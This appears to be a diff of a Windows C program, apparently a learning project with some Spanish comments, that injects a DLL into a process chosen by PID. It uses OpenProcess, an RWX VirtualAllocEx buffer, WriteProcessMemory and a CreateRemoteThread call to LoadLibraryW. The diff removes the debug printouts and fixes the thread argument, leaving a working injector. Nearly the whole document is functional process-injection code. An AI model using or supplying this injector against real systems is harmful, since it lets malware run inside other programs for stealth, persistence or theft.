@@ -1,82 +1,72 @@
-
 #include <windows.h>
 #include <stdio.h>
 
 
-const char* k = "[+]";
-const char* e = "[-]";
-const char* i = "[*]";
-
 int main(int argc, char* argv[]) {
 
-    /* declare and initialize some vars for later use */
-    PVOID rBuffer = NULL;
-    DWORD dwPID, dwTID = NULL;
+    // Declare variables
+    PVOID buffer = NULL;
+    DWORD pid, tid = NULL;
     HANDLE hProcess, hThread = NULL;
     HANDLE hKernel32 = NULL;
 
-    wchar_t dllPath[MAX_PATH] = L"C:\\Users\\paula\\dllExampleInjection.dll";
+    wchar_t dllPath[MAX_PATH];
+    wchar_t fileName[] = L"dllExampleInjection.dll";
+    
+    
+    // Guarda en dllPath los que devuelve _wgetenv(L"USERPROFILE") separado por \\ filename (dllExampleInjection.dll)
+    // De esta forma la dll se guarda siempre en C:\Users\<usuario>, independientemente del usuario
+    swprintf(dllPath, MAX_PATH, L"%s\\%s", _wgetenv(L"USERPROFILE"), fileName);
+
     size_t pathSize = sizeof(dllPath);
 
+    // Get handle to the process in which we want to inject the dll
     if (argc < 2) {
-        printf("%s usage: %s <PID>", e, argv[0]);
         return EXIT_FAILURE;
     }
 
-    dwPID = atoi(argv[1]);
-
-    printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);
-
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); 
+    pid = atoi(argv[1]);
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); 
 
     if (hProcess == NULL) {
-        printf("%s failed to get a handle to the process, error: 0x%lx", e, GetLastError());
         return EXIT_FAILURE;
     }
 
-    printf("%s got a handle to the process\n\\---0x%p\n", k, hProcess);
+    // Reserve memory in the address space of the process
+    buffer = VirtualAllocEx(hProcess, NULL, pathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 
-    rBuffer = VirtualAllocEx(hProcess, NULL, pathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    printf("%s allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", k, pathSize);
-
-    if (rBuffer == NULL) {
-        printf("%s failed to allocate buffer, error: 0x%lx", e, GetLastError());
+    if (buffer == NULL) {
         return EXIT_FAILURE;
     }
 
-    WriteProcessMemory(hProcess, rBuffer, dllPath, pathSize, NULL);
-    printf("%s wrote %zd-bytes to allocated buffer\n", k, sizeof(dllPath));
+    // Write into the memory space of the process
+    WriteProcessMemory(hProcess, buffer, dllPath, pathSize, NULL);
 
+    // Get a handle to Kernel32 dll
     hKernel32 = GetModuleHandleW(L"kernel32");
 
 	if (hKernel32 == NULL) {
-		printf("failed to get a handle to Kernel32.dll, error: 0x%lx", GetLastError());
 		return EXIT_FAILURE;
 	}
-    printf("%s got a handle to Kernel32.dll\n\\---0x%p\n", k, hKernel32);
 
+    // Get the address of the LoadLibrary function from the kernel32.dll
     LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
-    printf("%s got the address od LoadLibraryW()\n\\---0x%p\n", k, startThis);
 
+    // Create a thread in the target process to execute the function LoadLibraryW with the argument buffer
+    hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, buffer, 0, &tid);
 
-    /* create thread to run our payload */
-    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, startThis, NULL, 0, 0, &dwTID);
     
     if (hThread == NULL) {
-        printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
     
-    printf("%s got a handle to the newly-created thread (%ld)\n\\---0x%p\n", k, dwTID, hProcess);
-
-    printf("%s waiting for thread to finish executing\n", i);
+    // Wait for the thread to finish its execution indefinitely
     WaitForSingleObject(hThread, INFINITE);
-    printf("%s thread finished executing, cleaning up\n", k);
 
     CloseHandle(hThread);
     CloseHandle(hProcess);
-    printf("%s finished, see you next time :>", k);
+
 
     return EXIT_SUCCESS;
 
